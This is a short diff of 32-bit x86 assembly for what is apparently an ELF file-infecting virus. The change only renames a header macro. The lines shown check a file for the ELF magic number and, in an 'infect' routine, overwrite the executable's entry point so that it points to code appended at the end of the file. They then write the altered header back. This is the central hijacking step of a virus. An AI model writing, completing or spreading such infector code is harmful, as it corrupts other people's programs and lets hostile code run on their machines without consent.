@@ -52,7 +52,7 @@
 %define ELFHDR_phoff	28
 
 %define FD dword [ebp - 4]
-%define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
+%define ELFHDR ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
 
 	global _start
 
@@ -62,8 +62,8 @@
 checkELF:
 	; Checking if file is an elf file
 	mov FD, eax
-	lea ecx, [ELF_header]		; Grabbing the effective address of elf header
-	read FD, ecx, ELFHDR_size			; [ELF_HEADER] = E L F ........ ENTRY 
+	lea ecx, [ELFHDR]		; Grabbing the effective address of elf header
+	read FD, ecx, ELFHDR_size			; [ELFHDR] = E L F ........ ENTRY 
 	lea esi, [ecx]
 	cmp dword [esi], 0x464C457F
 	jne not_elf
@@ -89,8 +89,8 @@ infect:
 	lseek FD, 0, SEEK_SET
 	mov eax, 0x8048000 			; ELF base address
 	add eax, esi 				; Set eax to end of file
-	mov dword [ELF_header + ENTRY], eax
-	lea ecx, [ELF_header]		
+	mov dword [ELFHDR + ENTRY], eax
+	lea ecx, [ELFHDR]		
 	write FD, ecx, ELFHDR_size	; Writing the modified header
 
 	close FD
